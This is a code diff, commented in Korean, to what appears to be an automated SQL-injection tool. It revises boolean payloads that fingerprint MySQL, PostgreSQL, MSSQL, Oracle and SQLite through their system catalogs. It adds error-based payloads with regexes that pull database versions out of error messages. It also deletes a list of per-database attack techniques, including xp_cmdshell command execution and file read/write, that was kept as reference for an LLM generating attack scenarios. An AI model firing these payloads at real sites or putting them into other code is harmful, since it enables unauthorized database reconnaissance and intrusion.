@@ -68,13 +68,21 @@ ERROR_PATTERNS: list[tuple[str, DBMSType]] = [
 
 # Phase 2: Boolean-based DBMS 식별
 # (DBMS, 참 페이로드, 거짓 페이로드)
-# 참 응답과 거짓 응답의 길이/상태코드 차이로 DBMS 식별
+# 각 DBMS 고유 시스템 카탈로그를 참조 → 다른 DBMS에서는 에러로 양쪽 응답 동일 → 부수 매칭 제거
+# 참: COUNT(*) > 0 (시스템 테이블에 데이터 있으면 참)
+# 거짓: COUNT(*) < 0 (COUNT는 음수가 안 나오므로 항상 거짓)
+# 출처: Nmap NSE (mysql-databases.nse, ms-sql-info.nse, oracle-*.nse 등)
 BOOLEAN_PROBES: list[tuple[DBMSType, str, str]] = [
-    (DBMSType.MYSQL,      "' AND SLEEP(0)=0-- -",         "' AND SLEEP(999)=0-- -"),
-    (DBMSType.POSTGRESQL, "' AND PG_SLEEP(0) IS NULL-- -","' AND PG_SLEEP(999) IS NULL-- -"),
-    (DBMSType.MSSQL,      "' AND 1=CONVERT(int,'0')-- -", "' AND 1=CONVERT(int,'a')-- -"),
-    (DBMSType.ORACLE,     "' AND 1=1-- -",                "' AND 1=2-- -"),
-    (DBMSType.SQLITE,     "' AND TYPEOF(1)='integer'-- -","' AND TYPEOF(1)='text'-- -"),
+    (DBMSType.MYSQL,      "' AND (SELECT COUNT(*) FROM information_schema.engines)>0-- -",
+                          "' AND (SELECT COUNT(*) FROM information_schema.engines)<0-- -"),
+    (DBMSType.POSTGRESQL, "' AND (SELECT COUNT(*) FROM pg_database)>0-- -",
+                          "' AND (SELECT COUNT(*) FROM pg_database)<0-- -"),
+    (DBMSType.MSSQL,      "' AND (SELECT COUNT(*) FROM master..sysdatabases)>0-- -",
+                          "' AND (SELECT COUNT(*) FROM master..sysdatabases)<0-- -"),
+    (DBMSType.ORACLE,     "' AND (SELECT COUNT(*) FROM v$version)>0-- -",
+                          "' AND (SELECT COUNT(*) FROM v$version)<0-- -"),
+    (DBMSType.SQLITE,     "' AND (SELECT COUNT(*) FROM sqlite_master)>0-- -",
+                          "' AND (SELECT COUNT(*) FROM sqlite_master)<0-- -"),
 ]
 
 # Phase 3: 버전 추출 Boolean 페이로드
@@ -107,6 +115,23 @@ VERSION_PROBES: dict[DBMSType, list[tuple[str, str]]] = {
     DBMSType.SQLITE: [
         ("3.x", "' AND SQLITE_VERSION() LIKE '3.%'-- -"),
         ("2.x", "' AND SQLITE_VERSION() LIKE '2.%'-- -"),
+    ],
+}
+
+# Phase 3 fallback: 에러 메시지에서 버전 직접 파싱
+# Boolean 프로빙이 실패할 때 사용 (에러 기반 취약점이 확인된 환경)
+# (payload, 버전 추출 정규식)
+ERROR_VERSION_PROBES: dict[DBMSType, list[tuple[str, str]]] = {
+    DBMSType.MSSQL: [
+        ("' AND 1=CONVERT(int,@@VERSION)-- -",  r'microsoft sql server\s+(\d{4})'),
+        (" AND 1=CONVERT(int,@@VERSION)-- -",   r'microsoft sql server\s+(\d{4})'),
+    ],
+    DBMSType.MYSQL: [
+        ("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", r"xpath syntax error:\s*['\"]~?(\d[\d.]*)"),
+        ("' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)-- -",  r"xpath syntax error:\s*['\"]~(\d[\d.]*)"),
+    ],
+    DBMSType.POSTGRESQL: [
+        ("' AND CAST(version() AS INT)-- -", r'postgresql\s+(\d+\.\d+)'),
     ],
 }
 
@@ -260,43 +285,4 @@ POSSIBLE_QUERIES: dict[DBMSType, dict[str, list[str]]] = {
     DBMSType.UNKNOWN: {},
 }
 
-# 시나리오 생성 LLM 참고용: DBMS별 적용 가능한 공격 기법
-APPLICABLE_TECHNIQUES: dict[DBMSType, list[str]] = {
-    DBMSType.MYSQL: [
-        "Error-based (EXTRACTVALUE, UPDATEXML)",
-        "Union-based",
-        "Boolean-based blind",
-        "Time-based blind (SLEEP)",
-        "Stacked queries",
-        "File read/write (LOAD_FILE, INTO OUTFILE)",
-    ],
-    DBMSType.POSTGRESQL: [
-        "Error-based (CAST)",
-        "Union-based",
-        "Boolean-based blind",
-        "Time-based blind (PG_SLEEP)",
-        "Stacked queries",
-        "COPY TO/FROM (파일 접근)",
-    ],
-    DBMSType.MSSQL: [
-        "Error-based (CONVERT, CAST)",
-        "Union-based",
-        "Boolean-based blind",
-        "Time-based blind (WAITFOR DELAY)",
-        "Stacked queries",
-        "xp_cmdshell (OS 명령 실행)",
-    ],
-    DBMSType.ORACLE: [
-        "Error-based (CTXSYS.DRITHSX.SN)",
-        "Union-based",
-        "Boolean-based blind",
-        "Time-based blind (DBMS_PIPE.RECEIVE_MESSAGE)",
-    ],
-    DBMSType.SQLITE: [
-        "Error-based",
-        "Union-based",
-        "Boolean-based blind",
-        "Time-based blind (RANDOMBLOB 과부하)",
-    ],
-    DBMSType.UNKNOWN: [],
-}
+ERROR_PATTERNS.sort(key=lambda x: len(x[0]), reverse=True)
